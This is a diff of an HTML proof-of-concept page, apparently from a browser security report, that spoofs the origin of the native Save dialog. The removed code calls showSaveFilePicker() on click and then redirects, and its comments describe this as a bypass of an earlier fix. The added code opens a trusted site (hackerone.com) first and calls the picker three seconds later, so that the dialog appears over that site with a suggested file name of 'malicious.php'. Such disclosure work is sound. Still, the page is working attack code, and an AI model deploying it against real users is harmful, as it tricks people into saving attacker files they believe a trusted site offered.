@@ -11,35 +11,23 @@
   </style>
 </head>
 <body>
-  <h1>Click me anywhere.<br>You will be taken to the trusted site to save your file.</h1>
+  <h1>Click me anywhere.</h1>
 
   <script>
-    // Bypass of the delayed-picker fix (issue 419721056).
-    // The fix suppresses showSaveFilePicker() when it is CALLED while the page
-    // is inactive. Here the picker is CALLED while the page is still active
-    // (on the click), and the redirect happens right after. The native Save
-    // dialog renders a few seconds later — by which time the tab already shows
-    // the trusted origin — so the dialog is presented OVER the trusted site.
-
-    const TRUSTED_URL = 'https://hackerone.com';   // origin to spoof
-    const REDIRECT_AFTER_MS = 300;                  // navigate shortly after the call
+    const TRUSTED_URL = 'https://hackerone.com';
+    const PICKER_AFTER_MS = 3000;
 
     document.addEventListener('click', () => {
-      if (!('showSaveFilePicker' in window)) { alert('showSaveFilePicker unsupported'); return; }
+      // 1) Redirect FIRST (window.open keeps this page alive so the timer below still runs).
+      window.open(TRUSTED_URL);
 
-      // 1) Invoke the picker WHILE THE PAGE IS ACTIVE (this is what evades the fix).
-      window.showSaveFilePicker({
-        suggestedName: 'malicious.php',
-        types: [{ description: 'Text Files', accept: { 'text/plain': ['.php'] } }]
-      }).then(async (handle) => {
-        // A real attacker would write here; kept benign for the PoC.
-        // const w = await handle.createWritable(); await w.write('...'); await w.close();
-        console.log('handle:', handle && handle.name);
-      }).catch(() => { /* user cancelled */ });
-
-      // 2) Redirect to the trusted site. The dialog paints a few seconds later,
-      //    over this trusted origin.
-      setTimeout(() => { window.location.href = TRUSTED_URL; }, REDIRECT_AFTER_MS);
+      // 2) After 3s, the picker opens — over the redirected trusted site.
+      setTimeout(() => {
+        window.showSaveFilePicker({
+          suggestedName: 'malicious.php',
+          types: [{ description: 'Text Files', accept: { 'text/plain': ['.php'] } }]
+        }).catch(() => {});
+      }, PICKER_AFTER_MS);
     }, { once: true });
   </script>
 </body>
